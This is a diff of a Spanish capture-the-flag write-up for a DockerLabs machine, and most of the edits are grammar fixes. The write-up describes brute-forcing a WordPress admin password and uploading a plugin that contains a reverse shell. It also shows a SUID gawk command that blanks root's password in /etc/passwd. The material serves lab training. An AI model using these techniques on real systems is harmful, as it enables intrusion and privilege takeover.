@@ -2,14 +2,38 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Medio
+Dificultad: Media
 VectorInicial: WordPress brute force (admin:rockyou) + subida plugin malicioso
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - admin: rockyou
+ - root sin contraseña tras modificar /etc/passwd
+Usuarios:
+ - www-data
+ - root
 Privesc: SUID gawk → modificación /etc/passwd
+Tecnicas:
+ - Service Enumeration
+ - Directory Enumeration
+ - WordPress Enumeration
+ - Password Brute Force
+ - Malicious Plugin Upload
+ - Reverse Shell
+ - SUID Abuse
+ - Privilege Escalation
+Herramientas:
+ - gomap
+ - gobuster
+ - wpscan
+ - 7z
+ - penelope
+ - gawk
 Fecha: 2026-02-18
 ---
 <img width="918" height="516" alt="Pasted image 20260217124550" src="https://github.com/user-attachments/assets/76afc7f1-689f-48fe-9a86-5249734c2675" />
 
-Empezaremos con un reconocimiento de la superficie para que encontramos.
+Empezaremos con un reconocimiento de la superficie para ver qué encontramos.
 
 ```bash
  gomap -s $TARGET
@@ -24,7 +48,7 @@ Host Exposure Summary
 ✓ Completed scan in 27ms | hosts: 1 | open ports: 1
 ```
 
-Como solo tiene un puerto abierto nos dirigimos a la web para ver que encontramos.
+Como solo tiene un puerto abierto, nos dirigimos a la web para ver qué encontramos.
 
 Solo hay un botón con un error, pero esto es raro, así que procedemos a realizar una enumeración de directorios.
 
@@ -54,9 +78,9 @@ Finished
 ===============================================================
 ```
 
-Vemos que tenemos un **Wordpress** y un **PhpMyAdmin**, así que empezaremos por navegar al *Wordpress*.
+Vemos que tenemos un **WordPress** y un **phpMyAdmin**, así que empezaremos por navegar al *WordPress*.
 
-Pero nos redirige a un dominio así que lo indicaremos en */ect/hosts*.
+Pero nos redirige a un dominio, así que lo indicaremos en `/etc/hosts`.
 
 ```bash
  sudo nano /etc/hosts
@@ -78,7 +102,7 @@ Encontramos la web de un guitarrista y procedemos a la enumeración visual de la
  wpscan --url http://escolares.dl/wordpress/ -e u,p
 ```
 
-Visualmente no encontramos nada interesante, pero desde *wpscan encontramos*.
+Visualmente no encontramos nada interesante, pero desde `wpscan` sí encontramos información relevante.
 
 ```bash
 _______________________________________________________________
@@ -219,9 +243,9 @@ Lo interesante de estos plugins son las vulnerabilidades:
 - elementor
 	- Admin+ Arbitrary File Read via Image Import
 
-Buscamos información para ver cual de los 2 puede ser mas interesante.
+Buscamos información para ver cuál de los dos puede ser más interesante.
 
-Descubrimos que necesitamos al menos privilegios de autor o admin, así que vamos a probar a realizar un ataque de diccionario contra el usuario *admin* y encontrar su clave de acceso.
+Descubrimos que necesitamos al menos privilegios de autor o de administrador, así que vamos a probar un ataque de diccionario contra el usuario `admin` para encontrar su clave de acceso.
 
 ```bashh
  wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
@@ -234,15 +258,15 @@ Descubrimos que necesitamos al menos privilegios de autor o admin, así que vamo
 <skip>
 ```
 
-Ya con los credenciales iniciaremos sesión y nos dirigiremos a los plugins vulnerables.
+Ya con las credenciales, iniciaremos sesión y nos dirigiremos a los plugins vulnerables.
 
-Cabe recordar que no es necesario el uso de las vulnerabilidades puesto que tenemos la opción de usar el editor de themes para inyectar código y conseguir un revershell.
+Cabe recordar que no sería estrictamente necesario usar estas vulnerabilidades, puesto que también tenemos la opción de usar el editor de temas para inyectar código y conseguir una reverse shell.
 
 <img width="1903" height="847" alt="Pasted image 20260217170840" src="https://github.com/user-attachments/assets/68aa3290-e425-4185-8ee2-5ec05588114c" />
 
-Pero como la finalidad de este laboratorio es la explotación de los plugin procederemos con los mismos.
+Pero como la finalidad de este laboratorio es la explotación de los plugins, procederemos con ellos.
 
-Primero usaremos un método de subida de un plugin malicioso, así que crearemos un fichero **PHP** con un revershell de pentestmonkey y luego lo comprimiremos en formato *zip* para poder subirlo a la web.
+Primero usaremos un método de subida de un plugin malicioso, así que crearemos un fichero **PHP** con una reverse shell de Pentestmonkey y luego lo comprimiremos en formato `zip` para poder subirlo a la web.
 
 No olvidar que al principio del fichero hay  que indicar unos datos para que reconozca que es un plugin.
 
@@ -262,7 +286,7 @@ License: GPL2
  7z a ./shell.zip ./shell.php
 ```
 
-Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* para después subir el plugin y al activarlo conseguir un reversehell.
+Ahora que tenemos el `zip` creado, nos pondremos a la escucha con **penelope** para después subir el plugin y, al activarlo, conseguir una reverse shell.
 
 ```bash
  penelope -p 443
@@ -272,7 +296,7 @@ Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* pa
 
 <img width="1503" height="719" alt="Pasted image 20260218091957" src="https://github.com/user-attachments/assets/e77c5e9c-4139-4134-a44c-04d2c5f29edd" />
 
-Una vez activo el plugin obtendremos una revershell y estaremos dentro del servidor.
+Una vez activado el plugin, obtendremos una reverse shell y estaremos dentro del servidor.
 
 ```bash
 [+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 😍️ Assigned SessionID <1>
@@ -296,14 +320,14 @@ www-data@07ea20f65d0d:/$ sudo -l
 [sudo] password for www-data:
 ```
 
-Al intentar ver a que tenemos permiso nos encontramos con una barrera, pero vamos a ver si el usuario **admin** existe en el sistema por si reutilizara la misma contraseña que en la web.
+Al intentar ver a qué tenemos permiso nos encontramos con una barrera, pero vamos a comprobar si el usuario **admin** existe en el sistema por si reutilizara la misma contraseña que en la web.
 
 ```bash
 www-data@07ea20f65d0d:/$ ls /home/
 ubuntu
 ```
 
-Vemos que este usuario no es el mismo y no nos sirve, intentemos buscar a ver si existe algún *SUID* y podemos aprovecharlo.
+Vemos que este usuario no es el mismo y no nos sirve, así que intentemos buscar si existe algún binario con *SUID* que podamos aprovechar.
 
 ```bash
 www-data@07ea20f65d0d:/$ find . -perm -4000 2>/dev/null 
@@ -321,13 +345,13 @@ www-data@07ea20f65d0d:/$ find . -perm -4000 2>/dev/null
 ./usr/bin/sudo
 ```
 
-Ahora solo nos queda buscar en *gtfobins* para realizar la escalada desde *gawk*.
+Ahora solo nos queda buscar en **GTFOBins** cómo realizar la escalada desde `gawk`.
 
 ```bash
 gawk 'BEGIN {system("/bin/sh")}'
 ```
 
-Pero esto solo abre una consola en modo *sh* de nuestro usuario así que indagamos mas y nos encontramos con una utilidad de este comando.
+Pero esto solo abre una consola en modo `sh` de nuestro usuario, así que indagamos más y nos encontramos con otra utilidad de este comando.
 
 ```bash
 www-data@2a7ff2dd9abe:/$ /usr/bin/gawk -F 'x' '{print $1 $NF > "/etc/passwd"}' /etc/passwd
@@ -341,12 +365,12 @@ premiumpassword
 root@2a7ff2dd9abe:/# 
 ```
 
-Con este comando hemos podido quitar la **X** al usuario *root* y podemos hacer uso del comando *su* para escalar privilegios.
+Con este comando hemos podido quitar la **x** del usuario `root` y ya podemos hacer uso del comando `su` para escalar privilegios.
 
-Ademas en la carpeta */tmp* nos encontramos un fichero curioso con una contraseña cifrada en *base64*.
+Además, en la carpeta `/tmp` nos encontramos un fichero curioso con una contraseña codificada en `base64`.
 
-Esta contraseña seguramente sea del usuario *ubuntu* o del *root* pero como ya tenemos la escalada lo dejaremos estar.
+Esta contraseña seguramente sea del usuario `ubuntu` o del propio `root`, pero como ya tenemos la escalada, lo dejaremos estar.
 
 ---
-Si te gusto puedes invitarme a un cafe.
+Si te gustó, puedes invitarme a un café.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
